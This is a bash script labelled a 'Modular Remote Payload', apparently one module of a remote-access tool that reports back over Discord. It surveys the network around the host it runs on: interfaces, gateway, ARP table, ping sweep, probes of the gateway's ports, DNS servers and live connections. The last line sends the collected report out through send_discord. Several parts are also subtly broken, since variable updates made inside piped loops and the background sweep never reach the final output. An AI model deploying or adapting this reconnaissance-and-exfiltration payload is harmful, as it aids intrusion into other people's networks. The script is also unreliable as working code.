#!/bin/bash
# ============================================================
# Network Scan for Linux - Modular Remote Payload
# ============================================================
# Scans local network for active hosts
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔍 **Network Scan from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Network interfaces
OUTPUT+="**🌐 INTERFACES**\n"
if command -v ip &>/dev/null; then
    ip -4 addr show | grep -E "inet|^[0-9]" | while read line; do
        OUTPUT+="\`$line\`\n"
    done
else
    ifconfig 2>/dev/null | grep -E "inet |^[a-z]" | while read line; do
        OUTPUT+="\`$line\`\n"
    done
fi
OUTPUT+="\n"

# Default gateway
OUTPUT+="**🚪 DEFAULT GATEWAY**\n"
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
OUTPUT+="• Gateway: \`$GATEWAY\`\n\n"

# ARP table
OUTPUT+="**📡 ARP TABLE**\n"
if command -v arp &>/dev/null; then
    arp -a 2>/dev/null | head -15 | while read line; do
        OUTPUT+="• $line\n"
    done
elif command -v ip &>/dev/null; then
    ip neigh show | head -15 | while read line; do
        OUTPUT+="• $line\n"
    done
fi
OUTPUT+="\n"

# Quick ping sweep of local subnet
OUTPUT+="**📶 ACTIVE HOSTS (Ping Sweep)**\n"
if [[ -n "$GATEWAY" ]]; then
    SUBNET=$(echo $GATEWAY | cut -d. -f1-3)
    ACTIVE_HOSTS=""
    for i in {1..254}; do
        ping -c 1 -W 1 "$SUBNET.$i" &>/dev/null && ACTIVE_HOSTS+="$SUBNET.$i "
    done &
    # Wait max 30 seconds
    sleep 5
    kill %1 2>/dev/null
    
    if [[ -n "$ACTIVE_HOSTS" ]]; then
        OUTPUT+="• Found: \`$ACTIVE_HOSTS\`\n"
    else
        OUTPUT+="• No hosts responded (firewall?)\n"
    fi
fi
OUTPUT+="\n"

# Open ports on gateway
OUTPUT+="**🔓 GATEWAY PORTS**\n"
if [[ -n "$GATEWAY" ]]; then
    for port in 22 80 443 445 3389 8080; do
        timeout 1 bash -c "echo >/dev/tcp/$GATEWAY/$port" 2>/dev/null && OUTPUT+="• \`$port\` ✅ OPEN\n"
    done
fi
OUTPUT+="\n"

# DNS servers
OUTPUT+="**🔎 DNS SERVERS**\n"
grep "nameserver" /etc/resolv.conf 2>/dev/null | while read line; do
    OUTPUT+="• $line\n"
done

# Active connections
OUTPUT+="\n**📊 ACTIVE CONNECTIONS**\n"
if command -v ss &>/dev/null; then
    ss -tunap 2>/dev/null | grep ESTAB | head -10 | while read line; do
        OUTPUT+="\`$line\`\n"
    done
elif command -v netstat &>/dev/null; then
    netstat -tunap 2>/dev/null | grep ESTABLISHED | head -10 | while read line; do
        OUTPUT+="\`$line\`\n"
    done
fi

send_discord "$OUTPUT"

